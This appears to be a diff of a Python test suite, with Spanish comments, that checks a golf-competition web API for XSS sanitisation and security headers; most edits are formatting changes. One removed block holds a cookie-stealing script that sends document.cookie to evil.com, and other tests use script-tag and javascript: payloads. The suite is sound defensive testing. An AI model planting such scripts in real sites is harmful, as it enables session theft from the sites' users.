@@ -34,22 +34,27 @@ class TestXSSInUserFields:
                 "email": f"xss{hash(payload)}@example.com",
                 "password": "ValidPassword123!",
                 "first_name": payload,
-                "last_name": "SafeLastName"
+                "last_name": "SafeLastName",
             }
 
             response = await client.post("/api/v1/auth/register", json=register_data)
 
             # Puede fallar por validación (longitud) o ser sanitizado
-            assert response.status_code in [201, 400, 422], \
-                f"Payload XSS debe ser sanitizado o rechazado: {payload}"
+            assert response.status_code in [
+                201,
+                400,
+                422,
+            ], f"Payload XSS debe ser sanitizado o rechazado: {payload}"
 
             if response.status_code == 201:
                 # Si se creó, verificar que el script fue sanitizado
                 user_data = response.json()
-                assert "<script>" not in user_data.get("first_name", ""), \
+                assert "<script>" not in user_data.get("first_name", ""), (
                     "Los tags <script> deben ser sanitizados"
-                assert "javascript:" not in user_data.get("first_name", "").lower(), \
+                )
+                assert "javascript:" not in user_data.get("first_name", "").lower(), (
                     "Los protocolos javascript: deben ser sanitizados"
+                )
 
     async def test_xss_reflected_in_error_messages(self, client: AsyncClient):
         """
@@ -66,14 +71,13 @@ class TestXSSInUserFields:
             "email": malicious_email,
             "password": "ValidPassword123!",
             "first_name": "Test",
-            "last_name": "User"
+            "last_name": "User",
         }
 
         response = await client.post("/api/v1/auth/register", json=register_data)
 
         # Debe fallar con validación de email
-        assert response.status_code == 422, \
-            "Email con script debe ser rechazado por validación"
+        assert response.status_code == 422, "Email con script debe ser rechazado por validación"
 
         # El test documenta que los mensajes de error deben ser seguros
         # En producción, el frontend debe escapar todos los mensajes de error
@@ -90,7 +94,7 @@ class TestXSSInCompetitionFields:
         When: Se crea una competición con nombre malicioso
         Then: El nombre debe ser sanitizado
         """
-        client, user_data = authenticated_client
+        client, _user_data = authenticated_client
 
         xss_name = "<script>alert('Hacked')</script>Ryder Cup"
 
@@ -102,19 +106,23 @@ class TestXSSInCompetitionFields:
             "handicap_type": "PERCENTAGE",
             "handicap_percentage": 95,
             "max_players": 100,
-            "team_assignment": "MANUAL"
+            "team_assignment": "MANUAL",
         }
 
         response = await client.post("/api/v1/competitions", json=competition_data)
 
         # Puede ser sanitizado o rechazado
-        assert response.status_code in [201, 400, 422], \
-            "Input XSS debe ser sanitizado o rechazado"
+        assert response.status_code in [
+            201,
+            400,
+            422,
+        ], "Input XSS debe ser sanitizado o rechazado"
 
         if response.status_code == 201:
             competition = response.json()
-            assert "<script>" not in competition.get("name", ""), \
+            assert "<script>" not in competition.get("name", ""), (
                 "Los tags <script> deben ser removidos del nombre"
+            )
 
     async def test_xss_in_competition_description(self, authenticated_client):
         """
@@ -125,15 +133,7 @@ class TestXSSInCompetitionFields:
         NOTE: Este test asume que existe un campo description.
         Si no existe, el test pasará documentando el comportamiento esperado.
         """
-        client, user_data = authenticated_client
-
-        malicious_description = """
-        <p>This is a competition</p>
-        <script>
-            // Steal cookies
-            fetch('http://evil.com/steal?cookie=' + document.cookie);
-        </script>
-        """
+        client, _user_data = authenticated_client
 
         competition_data = {
             "name": "Test Competition",
@@ -143,7 +143,7 @@ class TestXSSInCompetitionFields:
             "handicap_type": "PERCENTAGE",
             "handicap_percentage": 95,
             "max_players": 100,
-            "team_assignment": "MANUAL"
+            "team_assignment": "MANUAL",
         }
 
         # Si el endpoint acepta description, agregarlo
@@ -152,8 +152,11 @@ class TestXSSInCompetitionFields:
         response = await client.post("/api/v1/competitions", json=competition_data)
 
         # El test documenta que TODOS los campos de texto deben sanitizarse
-        assert response.status_code in [201, 400, 422], \
-            "El endpoint debe sanitizar todos los inputs de texto"
+        assert response.status_code in [
+            201,
+            400,
+            422,
+        ], "El endpoint debe sanitizar todos los inputs de texto"
 
 
 @pytest.mark.asyncio
@@ -173,7 +176,7 @@ class TestXSSStoredAttacks:
             "email": "storedxss@example.com",
             "password": "ValidPassword123!",
             "first_name": xss_payload,
-            "last_name": "User"
+            "last_name": "User",
         }
 
         response = await client.post("/api/v1/auth/register", json=register_data)
@@ -182,7 +185,7 @@ class TestXSSStoredAttacks:
             # Login para verificar que el payload fue sanitizado
             login_data = {
                 "email": "storedxss@example.com",
-                "password": "ValidPassword123!"
+                "password": "ValidPassword123!",
             }
             login_response = await client.post("/api/v1/auth/login", json=login_data)
 
@@ -191,10 +194,12 @@ class TestXSSStoredAttacks:
 
             # Verificar que el payload XSS fue sanitizado
             first_name = user_data.get("first_name", "")
-            assert "onerror" not in first_name.lower(), \
+            assert "onerror" not in first_name.lower(), (
                 "Los event handlers (onerror, onload, etc.) deben ser removidos"
-            assert "<img" not in first_name.lower() or "src=x" not in first_name.lower(), \
+            )
+            assert "<img" not in first_name.lower() or "src=x" not in first_name.lower(), (
                 "Los tags maliciosos deben ser sanitizados"
+            )
 
 
 @pytest.mark.asyncio
@@ -213,7 +218,7 @@ class TestHTMLSanitization:
             "email": "htmltest@example.com",
             "password": "ValidPassword123!",
             "first_name": html_input,
-            "last_name": "User"
+            "last_name": "User",
         }
 
         response = await client.post("/api/v1/auth/register", json=register_data)
@@ -224,8 +229,9 @@ class TestHTMLSanitization:
 
             # Verificar que los tags HTML fueron removidos o escapados
             # Puede ser "Bold Italic Underline" (tags removidos) o texto escapado
-            assert "<b>" not in first_name or "&lt;b&gt;" in first_name, \
+            assert "<b>" not in first_name or "&lt;b&gt;" in first_name, (
                 "Los tags HTML deben ser removidos o escapados"
+            )
 
     async def test_javascript_protocol_blocked(self, client: AsyncClient):
         """
@@ -239,7 +245,7 @@ class TestHTMLSanitization:
             "email": "jsproto@example.com",
             "password": "ValidPassword123!",
             "first_name": javascript_payload,
-            "last_name": "User"
+            "last_name": "User",
         }
 
         response = await client.post("/api/v1/auth/register", json=register_data)
@@ -249,8 +255,9 @@ class TestHTMLSanitization:
             first_name = user_data.get("first_name", "")
 
             # El protocolo javascript: debe ser removido
-            assert "javascript:" not in first_name.lower(), \
+            assert "javascript:" not in first_name.lower(), (
                 "El protocolo javascript: debe ser bloqueado"
+            )
 
 
 @pytest.mark.asyncio
@@ -265,10 +272,12 @@ class TestSecurityHeaders:
         """
         response = await client.get("/api/v1/auth/verify-email?token=dummy")
 
-        assert "x-content-type-options" in response.headers, \
+        assert "x-content-type-options" in response.headers, (
             "Header X-Content-Type-Options debe estar presente"
-        assert response.headers["x-content-type-options"] == "nosniff", \
+        )
+        assert response.headers["x-content-type-options"] == "nosniff", (
             "X-Content-Type-Options debe ser 'nosniff'"
+        )
 
     async def test_xframe_options_header(self, client: AsyncClient):
         """
@@ -279,5 +288,6 @@ class TestSecurityHeaders:
         response = await client.get("/api/v1/auth/verify-email?token=dummy")
 
         # X-Frame-Options debe estar presente
-        assert "x-frame-options" in response.headers, \
+        assert "x-frame-options" in response.headers, (
             "Header X-Frame-Options debe estar presente para prevenir clickjacking"
+        )
